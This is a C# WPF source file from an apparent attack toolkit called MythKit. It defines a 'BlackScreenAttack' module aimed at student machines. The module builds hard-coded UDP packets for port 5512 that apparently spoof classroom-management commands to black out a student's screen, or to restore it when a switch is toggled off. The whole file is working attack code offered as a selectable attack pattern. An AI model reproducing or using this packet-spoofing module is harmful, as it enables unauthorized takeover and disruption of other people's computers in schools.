using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace MythKit.Pages.UDPAttack.AttackFunctions
{
    /// <summary>
    /// BlackScreenAttack.xaml 的交互逻辑
    /// </summary>
    [UDPAttackTypeLegacy("黑屏安静", nameof(ConstructPacket), AttackTarget.Student)]
    public partial class BlackScreenAttack : UserControl, IAttackPattern
    {
        public BlackScreenAttack()
        {
            InitializeComponent();
        }
        public string AttackName => "黑屏安静";
        public AttackTarget Target => AttackTarget.Student;
        public AttackPacket ConstructPacket(ref string message, string ip, int cycleCount, int groupCount)
        {
            byte[] packetBlack = new byte[55]
            {
                0x4d, 0x45, 0x53, 0x53, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x89, 0x84,
                0x27, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            byte[] packetRecovery = new byte[29]
            {
                0x4d, 0x45, 0x53, 0x53, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xc0, 0xa8, 0x89, 0x84,
                0x0d, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00
            };
            if (OpenCloseSwitch.IsOn)
            {
                return new AttackPacket(new List<byte[]> { packetBlack }, 5512);
            }
            else
            {
                return new AttackPacket(new List<byte[]> { packetRecovery }, 5512);
            }
        }
    }
}
